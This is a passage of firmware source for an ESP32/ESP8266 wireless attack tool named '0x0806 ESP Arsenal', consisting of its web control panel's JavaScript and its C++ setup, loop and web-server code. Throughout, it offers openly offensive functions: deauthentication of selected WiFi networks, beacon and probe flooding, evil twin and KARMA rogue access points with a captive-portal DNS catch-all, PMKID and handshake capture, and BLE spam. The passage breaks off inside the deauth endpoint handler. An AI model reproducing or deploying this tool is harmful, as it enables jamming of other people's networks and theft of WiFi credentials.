                    currentPlatform = data.platform;
                    document.getElementById('platformInfo').textContent = `Platform: ${currentPlatform}`;
                    
                    if (currentPlatform === 'ESP32') {
                        document.getElementById('bleTab').style.display = 'block';
                        updateBLEStatus('BLE support available');
                    } else {
                        updateBLEStatus('BLE not available on ESP8266');
                    }
                })
                .catch(error => {
                    console.error('Platform detection failed:', error);
                    updateScanStatus('Platform detection failed - Using fallback mode', 'idle');
                });
        }

        function loadSystemInfo() {
            fetch('/api/system')
                .then(response => response.json())
                .then(data => {
                    document.getElementById('memoryInfo').textContent = `Memory: ${data.freeHeap} KB`;
                    document.getElementById('uptimeInfo').textContent = `Uptime: ${data.uptime}`;
                    document.getElementById('freeHeapMem').textContent = data.freeHeap;
                    document.getElementById('systemUptime').textContent = Math.floor(data.uptimeMs / 60000);
                })
                .catch(error => console.error('System info failed:', error));
        }

        function showTab(tabName) {
            // Hide all tabs
            document.querySelectorAll('.tab-content').forEach(tab => {
                tab.classList.remove('active');
            });
            
            // Remove active class from all nav buttons
            document.querySelectorAll('.nav-btn').forEach(btn => {
                btn.classList.remove('active');
            });
            
            // Show selected tab and activate button
            document.getElementById(tabName).classList.add('active');
            event.target.classList.add('active');
            
            // Load tab-specific data
            if (tabName === 'scanner') {
                refreshNetworkList();
            } else if (tabName === 'ble' && currentPlatform === 'ESP32') {
                refreshBLEDeviceList();
            } else if (tabName === 'monitor') {
                updateAllStats();
            }
        }

        // WiFi Scanner Functions
        function startWiFiScan() {
            if (isScanning) return;
            
            isScanning = true;
            updateScanStatus('Scanning for WiFi networks...', 'active');
            document.getElementById('scanBtn').innerHTML = '<span class="loading-spinner"></span>Scanning...';
            document.getElementById('scanBtn').disabled = true;
            
            fetch('/api/scan/start', { method: 'POST' })
                .then(response => response.json())
                .then(data => {
                    if (data.success) {
                        // Start polling for scan results
                        setTimeout(checkScanProgress, 2000);
                    } else {
                        throw new Error(data.error || 'Scan failed to start');
                    }
                })
                .catch(error => {
                    console.error('Scan error:', error);
                    updateScanStatus('Scan failed: ' + error.message, 'idle');
                    resetScanButton();
                });
        }

        function checkScanProgress() {
            fetch('/api/scan/results')
                .then(response => response.json())
                .then(data => {
                    if (data.scanning) {
                        // Still scanning, check again
                        setTimeout(checkScanProgress, 1000);
                    } else {
                        // Scan complete
                        networks = data.networks || [];
                        renderNetworks();
                        updateNetworkCounts();
                        updateScanStatus(`Scan complete - Found ${networks.length} networks`, 'idle');
                        resetScanButton();
                        isScanning = false;
                    }
                })
                .catch(error => {
                    console.error('Scan progress error:', error);
                    updateScanStatus('Scan error occurred', 'idle');
                    resetScanButton();
                    isScanning = false;
                });
        }

        function stopWiFiScan() {
            fetch('/api/scan/stop', { method: 'POST' })
                .then(response => response.json())
                .then(data => {
                    isScanning = false;
                    updateScanStatus('Scan stopped by user', 'idle');
                    resetScanButton();
                });
        }

        function resetScanButton() {
            document.getElementById('scanBtn').innerHTML = 'Start WiFi Scan';
            document.getElementById('scanBtn').disabled = false;
        }

        function renderNetworks() {
            const networkList = document.getElementById('networkList');
            
            if (networks.length === 0) {
                networkList.innerHTML = `
                    <div style="padding: 3rem; text-align: center; color: var(--text-secondary); font-size: 1.2rem;">
                        No networks found. Try scanning again.
                    </div>
                `;
                return;
            }

            let html = '';
            networks.forEach((network, index) => {
                const signalClass = network.rssi > -50 ? 'signal-strong' : 
                                   network.rssi > -70 ? 'signal-medium' : 'signal-weak';
                
                let badges = '';
                if (network.encryption === 'Open') badges += '<span class="badge badge-open">OPEN</span>';
                if (network.encryption.includes('WPA')) badges += '<span class="badge badge-wpa">WPA</span>';
                if (network.hidden) badges += '<span class="badge badge-hidden">HIDDEN</span>';

                html += `
                    <div class="network-item ${network.selected ? 'selected' : ''}" onclick="toggleNetworkSelection(${index})">
                        <input type="checkbox" class="checkbox" ${network.selected ? 'checked' : ''} 
                               onchange="event.stopPropagation(); toggleNetworkSelection(${index})">
                        <div class="network-info">
                            <div class="network-ssid">${escapeHtml(network.ssid || 'Hidden Network')}${badges}</div>
                            <div class="network-details">BSSID: ${network.bssid} | Channel: ${network.channel} | ${network.encryption}</div>
                        </div>
                        <div class="signal-strength ${signalClass}">${network.rssi}dBm</div>
                    </div>
                `;
            });
            
            networkList.innerHTML = html;
        }

        function toggleNetworkSelection(index) {
            if (index >= 0 && index < networks.length) {
                networks[index].selected = !networks[index].selected;
                renderNetworks();
                updateNetworkCounts();
            }
        }

        function selectAllNetworks() {
            networks.forEach(network => network.selected = true);
            renderNetworks();
            updateNetworkCounts();
        }

        function selectNoneNetworks() {
            networks.forEach(network => network.selected = false);
            renderNetworks();
            updateNetworkCounts();
        }

        function selectOpenNetworks() {
            networks.forEach(network => {
                network.selected = network.encryption === 'Open';
            });
            renderNetworks();
            updateNetworkCounts();
        }

        function selectStrongSignal() {
            networks.forEach(network => {
                network.selected = network.rssi > -60;
            });
            renderNetworks();
            updateNetworkCounts();
        }

        function clearNetworks() {
            networks = [];
            renderNetworks();
            updateNetworkCounts();
            updateScanStatus('Network list cleared', 'idle');
        }

        function updateNetworkCounts() {
            const selected = networks.filter(n => n.selected).length;
            document.getElementById('networkCount').textContent = networks.length;
            document.getElementById('selectedCount').textContent = selected;
            document.getElementById('targetNetworks').textContent = selected;
        }

        // Attack Functions
        function startDeauthAttack() {
            const selectedNets = networks.filter(n => n.selected);
            if (selectedNets.length === 0) {
                updateScanStatus('No networks selected for attack', 'idle');
                return;
            }

            const aggressive = document.getElementById('aggressiveDeauth').checked;
            
            fetch('/api/attack/deauth/start', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ 
                    networks: selectedNets,
                    aggressive: aggressive
                })
            })
            .then(response => response.json())
            .then(data => {
                if (data.success) {
                    isAttacking = true;
                    attackStartTime = Date.now();
                    updateScanStatus(`Deauth attack active on ${selectedNets.length} networks`, 'attacking');
                    document.getElementById('attackStatus').textContent = 'Deauthentication attack running';
                    document.getElementById('attackStatus').className = 'status-panel status-attacking';
                    startStatsUpdates();
                } else {
                    updateScanStatus('Failed to start deauth attack', 'idle');
                }
            })
            .catch(error => {
                console.error('Deauth attack error:', error);
                updateScanStatus('Deauth attack failed', 'idle');
            });
        }

        function stopDeauthAttack() {
            fetch('/api/attack/deauth/stop', { method: 'POST' })
                .then(response => response.json())
                .then(data => {
                    isAttacking = false;
                    updateScanStatus('Deauth attack stopped', 'idle');
                    document.getElementById('attackStatus').textContent = 'No attacks running';
                    document.getElementById('attackStatus').className = 'status-panel status-idle';
                    stopStatsUpdates();
                });
        }

        function startBeaconSpam() {
            fetch('/api/attack/beacon/start', { method: 'POST' })
                .then(response => response.json())
                .then(data => {
                    if (data.success) {
                        updateScanStatus('Beacon spam attack started', 'attacking');
                        document.getElementById('attackStatus').textContent = 'Beacon spam attack running';
                        document.getElementById('attackStatus').className = 'status-panel status-attacking';
                        isAttacking = true;
                        attackStartTime = Date.now();
                        startStatsUpdates();
                    }
                });
        }

        function stopBeaconSpam() {
            fetch('/api/attack/beacon/stop', { method: 'POST' })
                .then(response => response.json())
                .then(data => {
                    isAttacking = false;
                    updateScanStatus('Beacon spam stopped', 'idle');
                    document.getElementById('attackStatus').textContent = 'No attacks running';
                    document.getElementById('attackStatus').className = 'status-panel status-idle';
                    stopStatsUpdates();
                });
        }

        function startEvilTwin() {
            const selectedNets = networks.filter(n => n.selected);
            if (selectedNets.length === 0) {
                updateScanStatus('No networks selected for evil twin', 'idle');
                return;
            }

            fetch('/api/attack/eviltwin/start', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ networks: selectedNets })
            })
            .then(response => response.json())
            .then(data => {
                if (data.success) {
                    updateScanStatus(`Evil twin deployed for ${selectedNets.length} networks`, 'attacking');
                    document.getElementById('attackStatus').textContent = 'Evil twin attack running';
                    document.getElementById('attackStatus').className = 'status-panel status-attacking';
                    isAttacking = true;
                    attackStartTime = Date.now();
                    startStatsUpdates();
                }
            });
        }

        function stopEvilTwin() {
            fetch('/api/attack/eviltwin/stop', { method: 'POST' })
                .then(response => response.json())
                .then(data => {
                    isAttacking = false;
                    updateScanStatus('Evil twin stopped', 'idle');
                    document.getElementById('attackStatus').textContent = 'No attacks running';
                    document.getElementById('attackStatus').className = 'status-panel status-idle';
                    stopStatsUpdates();
                });
        }

        function startProbeAttack() {
            fetch('/api/attack/probe/start', { method: 'POST' })
                .then(response => response.json())
                .then(data => {
                    if (data.success) {
                        updateScanStatus('Probe attack started', 'attacking');
                        document.getElementById('attackStatus').textContent = 'Probe attack running';
                        document.getElementById('attackStatus').className = 'status-panel status-attacking';
                        isAttacking = true;
                        attackStartTime = Date.now();
                        startStatsUpdates();
                    }
                });
        }

        function stopProbeAttack() {
            fetch('/api/attack/probe/stop', { method: 'POST' })
                .then(response => response.json())
                .then(data => {
                    isAttacking = false;
                    updateScanStatus('Probe attack stopped', 'idle');
                    document.getElementById('attackStatus').textContent = 'No attacks running';
                    document.getElementById('attackStatus').className = 'status-panel status-idle';
                    stopStatsUpdates();
                });
        }

        function startHandshakeCapture() {
            fetch('/api/attack/handshake/start', { method: 'POST' })
                .then(response => response.json())
                .then(data => {
                    if (data.success) {
                        updateScanStatus('Handshake capture started', 'active');
                        document.getElementById('attackStatus').textContent = 'Handshake capture running';
                        document.getElementById('attackStatus').className = 'status-panel status-active';
                        startStatsUpdates();
                    }
                });
        }

        function stopHandshakeCapture() {
            fetch('/api/attack/handshake/stop', { method: 'POST' })
                .then(response => response.json())
                .then(data => {
                    updateScanStatus('Handshake capture stopped', 'idle');
                    document.getElementById('attackStatus').textContent = 'No attacks running';
                    document.getElementById('attackStatus').className = 'status-panel status-idle';
                    stopStatsUpdates();
                });
        }

        function startKarmaAttack() {
            fetch('/api/attack/karma/start', { method: 'POST' })
                .then(response => response.json())
                .then(data => {
                    if (data.success) {
                        updateScanStatus('KARMA attack started', 'attacking');
                        document.getElementById('attackStatus').textContent = 'KARMA attack running';
                        document.getElementById('attackStatus').className = 'status-panel status-attacking';
                        isAttacking = true;
                        attackStartTime = Date.now();
                        startStatsUpdates();
                    }
                });
        }

        function stopKarmaAttack() {
            fetch('/api/attack/karma/stop', { method: 'POST' })
                .then(response => response.json())
                .then(data => {
                    isAttacking = false;
                    updateScanStatus('KARMA attack stopped', 'idle');
                    document.getElementById('attackStatus').textContent = 'No attacks running';
                    document.getElementById('attackStatus').className = 'status-panel status-idle';
                    stopStatsUpdates();
                });
        }

        function startPMKIDAttack() {
            fetch('/api/attack/pmkid/start', { method: 'POST' })
                .then(response => response.json())
                .then(data => {
                    if (data.success) {
                        updateScanStatus('PMKID attack started', 'attacking');
                        document.getElementById('attackStatus').textContent = 'PMKID attack running';
                        document.getElementById('attackStatus').className = 'status-panel status-attacking';
                        isAttacking = true;
                        attackStartTime = Date.now();
                        startStatsUpdates();
                    }
                });
        }

        function stopPMKIDAttack() {
            fetch('/api/attack/pmkid/stop', { method: 'POST' })
                .then(response => response.json())
                .then(data => {
                    isAttacking = false;
                    updateScanStatus('PMKID attack stopped', 'idle');
                    document.getElementById('attackStatus').textContent = 'No attacks running';
                    document.getElementById('attackStatus').className = 'status-panel status-idle';
                    stopStatsUpdates();
                });
        }

        function emergencyStop() {
            fetch('/api/attack/stop/all', { method: 'POST' })
                .then(response => response.json())
                .then(data => {
                    isAttacking = false;
                    updateScanStatus('EMERGENCY STOP - All attacks terminated', 'idle');
                    document.getElementById('attackStatus').textContent = 'All attacks stopped';
                    document.getElementById('attackStatus').className = 'status-panel status-idle';
                    stopStatsUpdates();
                });
        }

        // BLE Functions
        function startBLEScan() {
            if (currentPlatform !== 'ESP32') {
                updateBLEStatus('BLE scanning requires ESP32 platform');
                return;
            }

            updateBLEStatus('Scanning for BLE devices...', 'active');
            
            fetch('/api/ble/scan/start', { method: 'POST' })
                .then(response => response.json())
                .then(data => {
                    if (data.success) {
                        setTimeout(checkBLEScanProgress, 3000);
                    }
                });
        }

        function checkBLEScanProgress() {
            fetch('/api/ble/devices')
                .then(response => response.json())
                .then(data => {
                    renderBLEDevices(data.devices || []);
                    updateBLEStatus(`BLE scan complete - Found ${data.devices.length} devices`, 'idle');
                    document.getElementById('bleDeviceCount').textContent = data.devices.length;
                });
        }

        function renderBLEDevices(devices) {
            const bleList = document.getElementById('bleDeviceList');
            
            if (devices.length === 0) {
                bleList.innerHTML = `
                    <div style="padding: 3rem; text-align: center; color: var(--text-secondary); font-size: 1.2rem;">
                        No BLE devices found
                    </div>
                `;
                return;
            }

            let html = '';
            devices.forEach(device => {
                html += `
                    <div class="network-item">
                        <div class="network-info">
                            <div class="network-ssid">${escapeHtml(device.name || 'Unknown Device')}</div>
                            <div class="network-details">Address: ${device.address} | RSSI: ${device.rssi}dBm</div>
                        </div>
                    </div>
                `;
            });
            
            bleList.innerHTML = html;
        }

        function startBLESpam() {
            if (currentPlatform !== 'ESP32') {
                updateBLEStatus('BLE spam requires ESP32 platform');
                return;
            }

            fetch('/api/ble/spam/start', { method: 'POST' })
                .then(response => response.json())
                .then(data => {
                    if (data.success) {
                        updateBLEStatus('BLE spam attack started', 'attacking');
                        isAttacking = true;
                        attackStartTime = Date.now();
                        startStatsUpdates();
                    }
                });
        }

        function stopBLESpam() {
            fetch('/api/ble/spam/stop', { method: 'POST' })
                .then(response => response.json())
                .then(data => {
                    isAttacking = false;
                    updateBLEStatus('BLE spam stopped', 'idle');
                    stopStatsUpdates();
                });
        }

        // Statistics Functions
        function startStatsUpdates() {
            if (statsInterval) clearInterval(statsInterval);
            
            statsInterval = setInterval(() => {
                updateAllStats();
                updateRuntime();
            }, 1000);
        }

        function stopStatsUpdates() {
            if (statsInterval) {
                clearInterval(statsInterval);
                statsInterval = null;
            }
        }

        function updateAllStats() {
            fetch('/api/stats')
                .then(response => response.json())
                .then(data => {
                    document.getElementById('deauthCount').textContent = data.deauth || 0;
                    document.getElementById('beaconCount').textContent = data.beacon || 0;
                    document.getElementById('probeCount').textContent = data.probe || 0;
                    document.getElementById('handshakeCount').textContent = data.handshakes || 0;
                    document.getElementById('bleSpamCount').textContent = data.ble || 0;
                    
                    const totalPackets = (data.deauth || 0) + (data.beacon || 0) + (data.probe || 0) + (data.ble || 0);
                    document.getElementById('totalPacketsSent').textContent = totalPackets;
                    
                    // Calculate packets per second
                    if (isAttacking && attackStartTime > 0) {
                        const runtime = (Date.now() - attackStartTime) / 1000;
                        const pps = runtime > 0 ? Math.round(totalPackets / runtime) : 0;
                        document.getElementById('packetsPerSecond').textContent = pps;
                    }
                })
                .catch(error => console.error('Stats update failed:', error));
        }

        function updateRuntime() {
            if (isAttacking && attackStartTime > 0) {
                const elapsed = Date.now() - attackStartTime;
                const minutes = Math.floor(elapsed / 60000);
                const seconds = Math.floor((elapsed % 60000) / 1000);
                document.getElementById('attackRuntime').textContent = 
                    `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
            }
        }

        function refreshStats() {
            updateAllStats();
            loadSystemInfo();
        }

        function resetAllStats() {
            fetch('/api/stats/reset', { method: 'POST' })
                .then(response => response.json())
                .then(data => {
                    updateAllStats();
                    updateScanStatus('All statistics reset', 'idle');
                });
        }

        // Utility Functions
        function updateScanStatus(message, type = 'idle') {
            const status = document.getElementById('scanStatus');
            status.textContent = message;
            status.className = `status-panel status-${type}`;
        }

        function updateBLEStatus(message, type = 'idle') {
            const status = document.getElementById('bleStatus');
            status.textContent = message;
            status.className = `status-panel status-${type}`;
        }

        function refreshNetworkList() {
            if (networks.length > 0) {
                renderNetworks();
                updateNetworkCounts();
            }
        }

        function refreshBLEDeviceList() {
            if (currentPlatform === 'ESP32') {
                fetch('/api/ble/devices')
                    .then(response => response.json())
                    .then(data => renderBLEDevices(data.devices || []));
            }
        }

        function escapeHtml(text) {
            const div = document.createElement('div');
            div.textContent = text;
            return div.innerHTML;
        }

        function saveSettings() {
            const settings = {
                attackDelay: document.getElementById('attackDelay').value,
                maxChannels: document.getElementById('maxChannels').value,
                stealthMode: document.getElementById('stealthMode').checked,
                captivePortal: document.getElementById('captivePortalSetting').checked
            };

            fetch('/api/settings/save', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(settings)
            })
            .then(response => response.json())
            .then(data => {
                updateScanStatus('Settings saved successfully', 'idle');
            });
        }

        function resetSettings() {
            document.getElementById('attackDelay').value = 100;
            document.getElementById('maxChannels').value = '1,6,11';
            document.getElementById('stealthMode').checked = false;
            document.getElementById('captivePortalSetting').checked = true;
            updateScanStatus('Settings reset to defaults', 'idle');
        }

        function rebootDevice() {
            if (confirm('Are you sure you want to reboot the device?')) {
                fetch('/api/system/reboot', { method: 'POST' })
                    .then(() => {
                        updateScanStatus('Device rebooting...', 'active');
                        setTimeout(() => {
                            location.reload();
                        }, 10000);
                    });
            }
        }

        function factoryReset() {
            if (confirm('WARNING: This will erase all settings. Continue?')) {
                fetch('/api/system/factory-reset', { method: 'POST' })
                    .then(() => {
                        updateScanStatus('Factory reset initiated...', 'active');
                        setTimeout(() => {
                            location.reload();
                        }, 15000);
                    });
            }
        }

        function startAutoRefresh() {
            // Auto-refresh system info every 30 seconds
            setInterval(() => {
                if (!isScanning && !isAttacking) {
                    loadSystemInfo();
                }
            }, 30000);
        }
    </script>
</body>
</html>
)rawliteral";

// Function prototypes
void initializeSystem();
void initializeWiFi();
void initializeBLE();
void initializeWebServer();
void handleRoot();
void handleNotFound();
void startWiFiScan();
void stopWiFiScan();
void performDeauthAttack();
void performBeaconSpam();
void performProbeAttack();
void performEvilTwin();
void performHandshakeCapture();
void performKarmaAttack();
void performPMKIDAttack();
void performBLESpam();
void sendDeauthFrame(uint8_t* target_bssid, uint8_t channel);
void sendBeaconFrame(String ssid, uint8_t channel);
bool sendRawPacket(uint8_t* packet, uint16_t length);
void updateLEDStatus();
void logActivity(String activity);
void parseMAC(String macStr, uint8_t* macBytes);
String macToString(uint8_t* mac);

void setup() {
  Serial.begin(115200);
  delay(2000); // Ensure serial is ready
  
  Serial.println();
  Serial.println("================================================");
  Serial.println("  0x0806 ESP Arsenal v7.0.0-Ultimate Starting  ");
  Serial.println("================================================");
  Serial.println();
  
  // Initialize core systems
  initializeSystem();
  initializeWiFi();
  
  #ifdef PLATFORM_ESP32
  initializeBLE();
  Serial.println("[BLE] Bluetooth Low Energy support enabled");
  #endif
  
  initializeWebServer();
  
  // Final system check
  if (apStarted) {
    systemReady = true;
    Serial.println();
    Serial.println("================================================");
    Serial.println("      SYSTEM READY - 0x0806 ESP ARSENAL       ");
    Serial.println("================================================");
    Serial.printf("Access Point: %s\n", AP_SSID);
    Serial.printf("IP Address: %s\n", WiFi.softAPIP().toString().c_str());
    Serial.printf("Platform: %s\n", 
      #ifdef PLATFORM_ESP32
      "ESP32"
      #else
      "ESP8266"
      #endif
    );
    Serial.println("Web Interface: http://192.168.4.1");
    Serial.println("================================================");
    Serial.println();
  } else {
    Serial.println("[ERROR] System failed to initialize properly");
  }
  
  stats.startTime = millis();
}

void loop() {
  yield();
  
  // Handle web server
  server.handleClient();
  yield();
  
  // Handle DNS for captive portal
  dnsServer.processNextRequest();
  yield();
  
  // Check and update scan progress
  static unsigned long lastScanCheck = 0;
  if (scanning && millis() - lastScanCheck > 1000) {
    lastScanCheck = millis();
    
    int n = WiFi.scanComplete();
    if (n >= 0) {
      // Scan completed
      scanning = false;
      networks.clear();
      
      for (int i = 0; i < n; i++) {
        if (networks.size() >= MAX_NETWORKS) break;
        
        WiFiNetwork net;
        net.ssid = WiFi.SSID(i);
        net.bssid = WiFi.BSSIDstr(i);
        net.channel = WiFi.channel(i);
        net.rssi = WiFi.RSSI(i);
        net.hidden = (net.ssid.length() == 0);
        net.selected = false;
        
        // Determine encryption type
        #ifdef PLATFORM_ESP32
        wifi_auth_mode_t encType = WiFi.encryptionType(i);
        switch(encType) {
          case WIFI_AUTH_OPEN: net.encryption = "Open"; break;
          case WIFI_AUTH_WEP: net.encryption = "WEP"; break;
          case WIFI_AUTH_WPA_PSK: net.encryption = "WPA"; break;
          case WIFI_AUTH_WPA2_PSK: net.encryption = "WPA2"; break;
          case WIFI_AUTH_WPA_WPA2_PSK: net.encryption = "WPA/WPA2"; break;
          case WIFI_AUTH_WPA2_ENTERPRISE: net.encryption = "WPA2-Enterprise"; break;
          case WIFI_AUTH_WPA3_PSK: net.encryption = "WPA3"; break;
          default: net.encryption = "Unknown"; break;
        }
        #else
        int encType = WiFi.encryptionType(i);
        switch(encType) {
          case ENC_TYPE_NONE: net.encryption = "Open"; break;
          case ENC_TYPE_WEP: net.encryption = "WEP"; break;
          case ENC_TYPE_TKIP: net.encryption = "WPA"; break;
          case ENC_TYPE_CCMP: net.encryption = "WPA2"; break;
          case ENC_TYPE_AUTO: net.encryption = "WPA/WPA2"; break;
          default: net.encryption = "Unknown"; break;
        }
        #endif
        
        // Parse BSSID
        String bssidStr = WiFi.BSSIDstr(i);
        parseMAC(bssidStr, net.bssid_bytes);
        
        networks.push_back(net);
      }
      
      WiFi.scanDelete();
      Serial.printf("[SCAN] Scan complete - Found %d networks\n", networks.size());
    }
  }
  
  // Perform active attacks
  if (deauthActive) {
    performDeauthAttack();
    yield();
  }
  
  if (beaconSpamActive) {
    performBeaconSpam();
    yield();
  }
  
  if (probeAttackActive) {
    performProbeAttack();
    yield();
  }
  
  if (evilTwinActive) {
    performEvilTwin();
    yield();
  }
  
  if (handshakeCaptureActive) {
    performHandshakeCapture();
    yield();
  }
  
  if (karmaAttackActive) {
    performKarmaAttack();
    yield();
  }
  
  if (pmkidAttackActive) {
    performPMKIDAttack();
    yield();
  }
  
  #ifdef PLATFORM_ESP32
  if (bleSpamActive) {
    performBLESpam();
    yield();
  }
  #endif
  
  // Update LED status
  updateLEDStatus();
  yield();
  
  // Handle emergency stop button
  if (digitalRead(BUTTON_PIN) == LOW) {
    delay(50);
    if (digitalRead(BUTTON_PIN) == LOW) {
      unsigned long pressStart = millis();
      while (digitalRead(BUTTON_PIN) == LOW && millis() - pressStart < 3000) {
        delay(100);
      }
      if (millis() - pressStart >= 3000) {
        // Emergency stop all attacks
        deauthActive = false;
        beaconSpamActive = false;
        probeAttackActive = false;
        evilTwinActive = false;
        handshakeCaptureActive = false;
        karmaAttackActive = false;
        pmkidAttackActive = false;
        bleSpamActive = false;
        attacking = false;
        
        Serial.println("[EMERGENCY] All attacks stopped by button press");
        logActivity("EMERGENCY STOP - All attacks terminated");
        
        // Flash LED rapidly to indicate emergency stop
        for (int i = 0; i < 10; i++) {
          digitalWrite(LED_PIN, LOW);
          delay(100);
          digitalWrite(LED_PIN, HIGH);
          delay(100);
        }
      }
    }
  }
  
  yield();
}

void initializeSystem() {
  Serial.println("[INIT] Initializing system components...");
  
  // Initialize pins
  pinMode(LED_PIN, OUTPUT);
  pinMode(BUTTON_PIN, INPUT_PULLUP);
  digitalWrite(LED_PIN, HIGH);
  
  // LED startup sequence
  for (int i = 0; i < 3; i++) {
    digitalWrite(LED_PIN, LOW);
    delay(200);
    digitalWrite(LED_PIN, HIGH);
    delay(200);
  }
  
  // Initialize file system
  if (!FILESYSTEM.begin()) {
    Serial.println("[FS] File system mount failed, formatting...");
    FILESYSTEM.format();
    if (FILESYSTEM.begin()) {
      Serial.println("[FS] File system formatted and mounted");
    } else {
      Serial.println("[FS] File system initialization failed");
    }
  } else {
    Serial.println("[FS] File system mounted successfully");
  }
  
  Serial.println("[INIT] System components initialized");
}

void initializeWiFi() {
  Serial.println("[WIFI] Initializing WiFi subsystem...");
  
  // Complete WiFi reset
  WiFi.mode(WIFI_OFF);
  delay(1000);
  
  #ifdef PLATFORM_ESP32
  WiFi.mode(WIFI_AP);
  #else
  WiFi.mode(WIFI_AP);
  #endif
  
  delay(500);
  
  // Configure AP IP settings
  IPAddress local_IP(192, 168, 4, 1);
  IPAddress gateway(192, 168, 4, 1);
  IPAddress subnet(255, 255, 255, 0);
  
  if (!WiFi.softAPConfig(local_IP, gateway, subnet)) {
    Serial.println("[WIFI] AP IP configuration failed - trying defaults");
  } else {
    Serial.println("[WIFI] AP IP configuration successful");
  }
  
  // Start Access Point with multiple attempts and different configs
  int attempts = 0;
  apStarted = false;
  
  while (!apStarted && attempts < 10) {
    attempts++;
    Serial.printf("[WIFI] AP start attempt %d/10...\n", attempts);
    
    switch(attempts) {
      case 1:
        apStarted = WiFi.softAP(AP_SSID, AP_PASS, 6, 0, 4);
        break;
      case 2:
        apStarted = WiFi.softAP(AP_SSID, AP_PASS, 1, 0, 4);
        break;
      case 3:
        apStarted = WiFi.softAP(AP_SSID, AP_PASS, 11, 0, 4);
        break;
      case 4:
        apStarted = WiFi.softAP(AP_SSID, AP_PASS);
        break;
      case 5:
        apStarted = WiFi.softAP(AP_SSID, "");
        break;
      case 6:
        apStarted = WiFi.softAP("ESP-Arsenal", AP_PASS);
        break;
      case 7:
        apStarted = WiFi.softAP("ESP-Arsenal", "");
        break;
      case 8:
        apStarted = WiFi.softAP("ESPArsenal", "12345678");
        break;
      case 9:
        apStarted = WiFi.softAP("ESPArsenal");
        break;
      default:
        apStarted = WiFi.softAP("ESP32Test");
        break;
    }
    
    delay(2000);
    
    // Verify AP is actually running
    if (apStarted) {
      IPAddress ip = WiFi.softAPIP();
      if (ip == IPAddress(0, 0, 0, 0)) {
        Serial.printf("[WIFI] AP started but no IP assigned, retrying...\n");
        apStarted = false;
        WiFi.softAPdisconnect(true);
        delay(1000);
      } else {
        Serial.printf("[WIFI] Access Point started successfully!\n");
        Serial.printf("[WIFI] SSID: %s\n", WiFi.softAPSSID().c_str());
        Serial.printf("[WIFI] IP: %s\n", ip.toString().c_str());
        Serial.printf("[WIFI] MAC: %s\n", WiFi.softAPmacAddress().c_str());
        Serial.printf("[WIFI] Clients can connect to this network now\n");
        break;
      }
    } else {
      Serial.printf("[WIFI] AP start attempt %d failed\n", attempts);
      WiFi.softAPdisconnect(true);
      delay(1000);
    }
  }
  
  if (!apStarted) {
    Serial.println("[ERROR] CRITICAL: Failed to start Access Point after all attempts!");
    Serial.println("[ERROR] Check your ESP module and try different firmware");
    return;
  }
  
  // Start DNS server for captive portal
  if (dnsServer.start(53, "*", WiFi.softAPIP())) {
    Serial.println("[DNS] DNS server started for captive portal");
  } else {
    Serial.println("[DNS] DNS server failed to start");
  }
  
  Serial.println("[WIFI] WiFi subsystem initialized successfully");
}

#ifdef PLATFORM_ESP32
void initializeBLE() {
  Serial.println("[BLE] Initializing Bluetooth Low Energy...");
  
  BLEDevice::init("0x0806-BLE-Arsenal");
  
  // Initialize BLE scanner
  pBLEScan = BLEDevice::getScan();
  pBLEScan->setAdvertisedDeviceCallbacks(new MyAdvertisedDeviceCallbacks());
  pBLEScan->setActiveScan(true);
  pBLEScan->setInterval(100);
  pBLEScan->setWindow(99);
  
  // Initialize BLE advertising
  pAdvertising = BLEDevice::getAdvertising();
  
  Serial.println("[BLE] BLE subsystem initialized");
}
#endif

void initializeWebServer() {
  Serial.println("[WEB] Setting up web server...");
  
  // Main interface
  server.on("/", HTTP_GET, handleRoot);
  
  // Platform detection
  server.on("/api/platform", HTTP_GET, []() {
    String json = "{\"platform\":\"";
    #ifdef PLATFORM_ESP32
    json += "ESP32";
    #else
    json += "ESP8266";
    #endif
    json += "\"}";
    
    server.sendHeader("Access-Control-Allow-Origin", "*");
    server.send(200, "application/json", json);
  });
  
  // System information
  server.on("/api/system", HTTP_GET, []() {
    String json = "{";
    json += "\"freeHeap\":" + String(ESP.getFreeHeap() / 1024) + ",";
    json += "\"uptime\":\"" + String((millis() / 1000) / 60) + "m\",";
    json += "\"uptimeMs\":" + String(millis()) + ",";
    #ifdef PLATFORM_ESP32
    json += "\"chipModel\":\"" + String(ESP.getChipModel()) + "\",";
    json += "\"cpuFreq\":" + String(ESP.getCpuFreqMHz()) + ",";
    json += "\"flashSize\":" + String(ESP.getFlashChipSize() / 1024 / 1024) + "";
    #else
    json += "\"chipId\":\"" + String(ESP.getChipId()) + "\",";
    json += "\"flashSize\":" + String(ESP.getFlashChipSize() / 1024 / 1024) + "";
    #endif
    json += "}";
    
    server.sendHeader("Access-Control-Allow-Origin", "*");
    server.send(200, "application/json", json);
  });
  
  // WiFi scan endpoints
  server.on("/api/scan/start", HTTP_POST, []() {
    server.sendHeader("Access-Control-Allow-Origin", "*");
    if (scanning) {
      server.send(200, "application/json", "{\"success\":false,\"error\":\"Scan already in progress\"}");
      return;
    }
    
    startWiFiScan();
    server.send(200, "application/json", "{\"success\":true}");
  });
  
  server.on("/api/scan/stop", HTTP_POST, []() {
    server.sendHeader("Access-Control-Allow-Origin", "*");
    stopWiFiScan();
    server.send(200, "application/json", "{\"success\":true}");
  });
  
  server.on("/api/scan/results", HTTP_GET, []() {
    String json = "{\"scanning\":" + String(scanning ? "true" : "false") + ",\"networks\":[";
    
    for (size_t i = 0; i < networks.size(); i++) {
      if (i > 0) json += ",";
      json += "{";
      json += "\"ssid\":\"" + networks[i].ssid + "\",";
      json += "\"bssid\":\"" + networks[i].bssid + "\",";
      json += "\"channel\":" + String(networks[i].channel) + ",";
      json += "\"rssi\":" + String(networks[i].rssi) + ",";
      json += "\"encryption\":\"" + networks[i].encryption + "\",";
      json += "\"selected\":" + String(networks[i].selected ? "true" : "false") + ",";
      json += "\"hidden\":" + String(networks[i].hidden ? "true" : "false");
      json += "}";
    }
    
    json += "]}";
    
    server.sendHeader("Access-Control-Allow-Origin", "*");
    server.send(200, "application/json", json);
  });
  
  // Attack endpoints
  server.on("/api/attack/deauth/start", HTTP_POST, []() {
    server.sendHeader("Access-Control-Allow-Origin", "*");
    
    // Parse request body for parameters
    String body = server.arg("plain");
    aggressiveMode = body.indexOf("\"aggressive\":true") != -1;
    
    deauthActive = true;
    attacking = true;
    
